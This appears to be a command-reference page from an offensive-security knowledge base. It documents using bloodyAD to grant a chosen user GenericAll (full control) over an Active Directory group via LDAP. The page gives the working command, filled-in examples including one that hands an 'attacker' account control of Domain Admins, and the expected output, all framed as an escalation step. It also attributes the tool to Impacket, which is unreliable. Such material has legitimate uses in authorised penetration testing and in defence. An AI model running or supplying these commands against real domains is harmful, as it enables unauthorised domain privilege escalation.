---
id: 46dd50c8-e612-416c-a8dd-af453bfe52cd
name: set-genericall-permission-on-interesting-group-via-bloodyad
type: command
executor: bash
data: >-
  python bloodyAD.py -U "$_USERNAME" -P "$_PASSWORD" --host $_DC_HOST -d
  $_DOMAIN setGenericAll "$_TARGET_USER" "cn=$_GROUP_NAME,dc=$_DOMAIN"
output: null
created_at: '2023-04-06T03:56:06.850668+00:00'
updated_at: '2023-04-10T20:36:10.633986+00:00'
platforms:
  - Linux
  - Windows
tags:
  - active-directory
  - acl
  - impacket
verified: true
validated: true
---

# set-genericall-permission-on-interesting-group-via-bloodyad

## Command

```bash
python bloodyAD.py -U "$_USERNAME" -P "$_PASSWORD" --host $_DC_HOST -d $_DOMAIN setGenericAll "$_TARGET_USER" "cn=$_GROUP_NAME,dc=$_DOMAIN"
```

## Description

This command uses the bloodyAD.py script from Impacket to grant GenericAll (full control) permission to a user on an Active Directory group object via LDAP. Ideal for escalation when basic WriteMembers is insufficient.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -U | Username for authentication | Yes |
| -P | Password for authentication | Yes |
| --host | Domain controller hostname or IP | Yes |
| -d | Domain name (e.g., corp.local) | Yes |
| setGenericAll | Action to set full control | Yes |
| $_TARGET_USER | User to grant permission to (e.g., devil_user1) | Yes |
| cn=$_GROUP_NAME,dc=$_DOMAIN | Distinguished Name (DN) of the target group | Yes |

## Examples

### Basic Usage

```bash
python bloodyAD.py -U "devil_user1" -P "P@ssword123" --host my.dc.corp -d corp setGenericAll "devil_user1" "cn=INTERESTING_GROUP,dc=corp"
```

### Advanced Usage

```bash
python bloodyAD.py -U admin -P pass --host dc01.corp -d corp.local setGenericAll "attacker" "cn=Domain Admins,dc=corp,dc=local"
```

## Expected Output

GenericAll permission set successfully for devil_user1 on cn=INTERESTING_GROUP,dc=corp.

Errors may include LDAP bind failures or insufficient privileges.

## Related

- [[procedures/Abuse-WriteDACL-to-Grant-Group-Membership-Permissions]]
- [[commands/remove-genericall-permission-on-interesting-group-via-bloodyad]]
